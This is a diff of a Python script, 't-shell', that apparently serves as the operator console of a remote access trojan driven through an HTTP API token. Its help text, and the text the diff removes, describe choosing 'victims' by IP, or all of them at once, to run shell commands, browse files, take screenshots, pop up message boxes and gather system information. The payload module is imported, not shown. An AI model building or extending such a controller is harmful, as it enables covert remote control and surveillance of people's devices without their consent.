@@ -1,62 +1,124 @@
+#!/usr/bin/env python3
+from os import system
 import argparse
+from server import server
+from setting import print_banner
 
-VERSION = "beta"
-IG_LINK = "instagram.com/laser01/"
+dictOpts = {
+    'api':None,
+    'output':None,
+    'user':None}
 
-BANNER = ("""
- _____          _          _ _ 
-|_   _|        | |        | | |
-  | |______ ___| |__   ___| | |
-  | |______/ __| '_ \ / _ \ | |
-  | |      \__ \ | | |  __/ | |
-  \_/      |___/_| |_|\___|_|_|
-                                                 
-	dev {0}
-	Version {1}                           
+def run():
+    server(dictOpts['api'],
+          dictOpts['user'],
+          dictOpts['output'])
+    print("Done")
+    
+def CheckStats():
+    if dictOpts['api'] == None:
+        ApiStat = 0
+    elif dictOpts['api'] != None:
+        ApiStat = 1
+    if dictOpts['output'] == None:
+        OutStat = 0
+    elif dictOpts['output'] != None:
+        OutStat = 1
+    if dictOpts['user'] == None:
+        UserStat = 0
+    elif dictOpts['user'] != None:
+        UserStat = 1
+    Stats = ApiStat+OutStat+UserStat
+    return Stats
+    
+def setter(option, value):
+    if option == "api":
+        dictOpts['api'] = value
+    elif option == "output":
+        dictOpts['output'] = value
+    elif option == "user":
+        dictOpts['user'] = value
 
+def print_options(printOpts=False):
+    OptsMessage = ("""
+Options:
+\tapi\t{}
+\toutput\t{}
+\tuser\t{}
+
+Help options:
+\tapi\tToken to access the HTTP API
+\toutput\tSave the output in file
+\tuser\tUser is allowed to command payload
 """.format(
-    IG_LINK, VERSION
+    dictOpts['api'], dictOpts['output'], dictOpts['user']
     )
-          )
+                   )
+    if printOpts:
+        print(OptsMessage)
+
+def print_help(printHelp=False):
+    helpMessage = ("""
+Help:
+
+Options:
+\thelp\tShow help message
+\toptions\tShow options message 
+\tset\tSet options api, output, user
+
+Payload:
+\t<IP> [option]\tChoose the device IP to control it
+\tall [option]\tSelect and control all connected device titles
+\tcmd [command]\tExcute command shell system device
+\tls\tDisplay a list of files
+\tpath\tDisplay a path
+\tcd [directory]\tChanges the current directory
+\tscreenshot\tTake a screenshot of device
+\tmessagebox [title] [message]\tDisplay a message box
+\tsysinfo\nDisplay same info about system
+""")
+    if printHelp:
+        print(helpMessage)
+        
+def Analysis(command):
+    text = command.split()
+    option = text[0]
+    if option == "set":
+        try:
+            var = text[1]
+            val = text[2]
+            setter(var, val)
+        except IndexError:
+            errmsg = ("error : set <option> <value>")
+            print(errmsg)
+    elif option == "run":
+        stats = CheckStats()
+        if stats == 3:
+            run()
+        elif stats == 2:
+            errmsg = ("error: run: There is one have not given a value")
+            print(errmsg)
+        elif stats == 1:
+            errmsg = ("error: run: There are two have not give it value")
+            print(errmsg)
+        elif stats == 0:
+            errmsg = ("error: run: There are three did not give it value")
+            print(errmsg)
+    elif option == "options":
+            print_options(True)
+    elif option == "help":
+            print_help(True)
+    else:
+        errmsg = ("error: t-shell: There is no command: {}".format(
+            option
+            )
+                  )
+        print(errmsg)
 
 def main():
-    parser = argparse.ArgumentParser(prog="telpot.py", add_help=True, usage=("python t-shell.py -hh"))
-    parser.add_argument("-hh", dest="helpusing", action="store_true" ,
-                        help="Display help command message and exit")
-    args = parser.parse_args()
-
-    print(BANNER)
-    
-    if args.helpusing:
-        helpmsg = ("""
-
-#Check who is online
-online?
-
-#Choose victem
-<ip> [option]
-or for all victims
-all [option]
-
-#Display sysinfo
-<ip> sysinfo
-
-#Excute shell command
-<ip> cmd [commands]
-
-#Change dir
-<ip> cd dir
-
-#List dir
-<ip> lsdir
-
-#Get path
-<ip> path
-
-#Open url
-<ip> url [url]
-
-""")
-        print(helpmsg)
+    print_banner(True)
+    while True:
+        command = input("t-shell> ")
+        Analysis(command)
 if __name__ == '__main__':
     main()
